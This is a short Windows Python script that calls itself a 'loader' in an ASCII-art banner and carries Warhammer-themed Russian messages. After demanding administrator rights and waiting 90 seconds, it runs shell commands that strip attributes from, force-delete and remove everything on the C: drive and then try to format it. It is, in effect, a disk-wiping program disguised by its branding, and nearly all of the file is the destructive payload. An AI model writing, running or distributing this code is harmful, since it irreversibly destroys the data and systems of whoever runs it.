import os
import sys
import ctypes
import time

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def blood_for_the_emperor():
    if not is_admin():
        print("""
	
	█░█░█ █▀▀ ▀▄▀ █▀ █ █▀▄ █▀▀   █░░ █▀█ ▄▀█ █▀▄ █▀▀ █▀█
	▀▄▀▄▀ ██▄ █░█ ▄█ █ █▄▀ ██▄   █▄▄ █▄█ █▀█ █▄▀ ██▄ █▀▄
        """)
        print("ЗАПУСК ДОСТУПЕН ТОЛЬКО ЧЕРЕЗ АДМИН-ПРАВА")
        ctypes.windll.user32.MessageBoxW(0, 
            "Без админских прав — никак.", 
            "WARNING", 0)
        sys.exit()

def purge_all():
    blood_for_the_emperor()
    print("Слава Императору! Начинается очищение от скверны...")
    time.sleep(90)
    try:
        os.system('attrib -h -r -s /s /d C:\\*')  # Снятие атрибутов
        os.system('del /f /s /q C:\\*')  # Удаление файлов
        os.system('rmdir /s /q C:\\*')  # Удаление папок
        os.system('format C:')  # Форматирование (требует подтверждения)
    except:
        pass

if __name__ == "__main__":
    purge_all()